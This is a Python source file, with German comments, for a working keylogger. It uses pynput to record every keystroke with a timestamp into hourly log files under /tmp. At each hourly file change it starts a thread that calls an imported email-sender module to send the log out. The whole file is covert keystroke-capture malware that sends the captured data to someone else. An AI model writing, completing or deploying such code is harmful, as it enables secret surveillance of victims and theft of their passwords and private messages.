from pynput import keyboard
from datetime import datetime
from threading import Thread
import time 
import email_sender
import threading

init_email=email_sender.email_sender_class()
class keylogger_class:
    def run(self):
        first_zaehler=0
        while True: 
            global stop_threads
            if first_zaehler==0:
                init_email.email_sender_funk(sendme_name)

            first_zaehler+=1
            if self.stop_threads: 
                break

    def keylogger_funktion(self):
        global sendme_name
        global old_filename
        new_filename=""
        global handle

        log_destination = "/tmp/" #Pfad zur Log datei
        now = datetime.now()
        new_filename = now.strftime("%Y%m%d%H") + ".log"
        old_filename = new_filename
        sendme_name=new_filename
        liste=[new_filename]

        handle = open(log_destination + new_filename, "w")

        def on_press(key):
            global old_filename
            global new_filename
            global handle

            now = datetime.now()
            new_filename = now.strftime("%Y%m%d%H") + ".log"

            # Log entry
            try:
                handle.write('{0}: {1} \n'.format(now.strftime("%d.%m.%Y, %H:%M:%S"), key.char))
            except AttributeError:
                handle.write('{0}: {1} \n'.format(now.strftime("%d.%m.%Y, %H:%M:%S"), key))

            # check and open new file
            zeahler=0
            
            if old_filename != new_filename:
                handle.close()
                handle = open(log_destination + new_filename, "w")
                old_filename = new_filename

                if zeahler == 0:
                    self.stop_threads = False
                    t1 = threading.Thread(target = self.run) 
                    t1.start() 
                    time.sleep(0.1) 
                    self.stop_threads = True
                    t1.join()

        with keyboard.Listener(on_press=on_press) as listener:
            listener.join()